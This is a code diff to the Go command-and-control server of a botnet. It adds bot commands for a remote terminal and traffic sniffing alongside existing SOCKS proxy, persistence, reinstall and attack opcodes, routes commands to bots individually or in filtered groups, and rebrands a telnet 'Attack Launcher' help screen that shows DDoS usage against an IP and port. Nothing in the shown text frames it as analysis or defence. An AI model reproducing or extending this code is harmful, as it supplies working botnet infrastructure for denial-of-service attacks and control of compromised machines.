@@ -27,9 +27,9 @@ var cmdMap = map[string]byte{
 	"!socks":      0x05,
 	"!stopsocks":  0x06,
 	"!socksauth":  0x07,
-	"!scan":       0x08,
-	"!stopscan":   0x09,
-	"!persist":    0x0A,
+	"!pty":        0x08,
+	"!ptydata":    0x09,
+"!persist":    0x0A,
 	"!attack":     0x0B,
 	"!stopattack": 0x0C,
 	"!reinstall":    0x0D,
@@ -42,13 +42,15 @@ var cmdMap = map[string]byte{
 	"!stopssh":    0x21,
 	"!http":       0x22,
 	"!stophttp":   0x23,
+	"!sniff":      0x24,
+	"!stopsniff":  0x25,
 	// NOTE: !upload intentionally omitted — sent as raw text to avoid
 	// the 64KB binary packet length limit truncating large base64 payloads.
 }
 
 // encodeCommand converts a text command ("!shell whoami") into a binary packet.
 // Returns nil if the command is not recognized (caller should send as text fallback).
-// VPE2: no XOR encryption — the transport layer (ChaCha20 + HMAC) handles all crypto.
+// EZF3: no XOR encryption — the transport layer (ChaCha20 + HMAC) handles all crypto.
 func encodeCommand(command string) []byte {
 	parts := strings.SplitN(strings.TrimSpace(command), " ", 2)
 	if len(parts) == 0 {
@@ -100,9 +102,9 @@ func sendToBots(command string) {
 			pkt := encodeCommand(command)
 			var err error
 			if pkt != nil {
-				_, err = botConn.conn.Write(pkt)
+				err = botConn.conn.WriteFrame(pkt)
 			} else {
-				_, err = botConn.conn.Write([]byte(command + "\n"))
+				err = botConn.conn.WriteFrame([]byte(command + "\n"))
 			}
 			if err != nil {
 				logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
@@ -148,9 +150,9 @@ func sendToFilteredBots(command string, archFilter string, minRAM int64, maxBots
 		pkt := encodeCommand(command)
 		var err error
 		if pkt != nil {
-			_, err = botConn.conn.Write(pkt)
+			err = botConn.conn.WriteFrame(pkt)
 		} else {
-			_, err = botConn.conn.Write([]byte(command + "\n"))
+			err = botConn.conn.WriteFrame([]byte(command + "\n"))
 		}
 		if err != nil {
 			logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
@@ -189,9 +191,9 @@ func sendToSingleBot(botID string, command string) bool {
 				pkt := encodeCommand(command)
 				var err error
 				if pkt != nil {
-					_, err = botConn.conn.Write(pkt)
+					err = botConn.conn.WriteFrame(pkt)
 				} else {
-					_, err = botConn.conn.Write([]byte(command + "\n"))
+					err = botConn.conn.WriteFrame([]byte(command + "\n"))
 				}
 				if err != nil {
 					logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
@@ -392,7 +394,7 @@ func userHasMethod(u User, method string) bool {
 
 func showTelnetHelp(conn net.Conn, c *client) {
 	conn.Write([]byte("\r\n\033[1;97m╔═══════════════════════════════════════════════════╗\r\n"))
-	conn.Write([]byte("\033[1;97m║            \033[1;36mArmada Attack Launcher\033[1;97m                 ║\r\n"))
+	conn.Write([]byte("\033[1;97m║            \033[1;36mVision Attack Launcher\033[1;97m                 ║\r\n"))
 	conn.Write([]byte("\033[1;97m╠═══════════════════════════════════════════════════╣\r\n"))
 	conn.Write([]byte("\033[1;97m║  \033[1;32mAttack:\033[0m  <method> <target> <port> <duration>     \033[1;97m║\r\n"))
 	conn.Write([]byte("\033[1;97m║  \033[1;32mExample:\033[0m udpplain 1.2.3.4 80 120                 \033[1;97m║\r\n"))
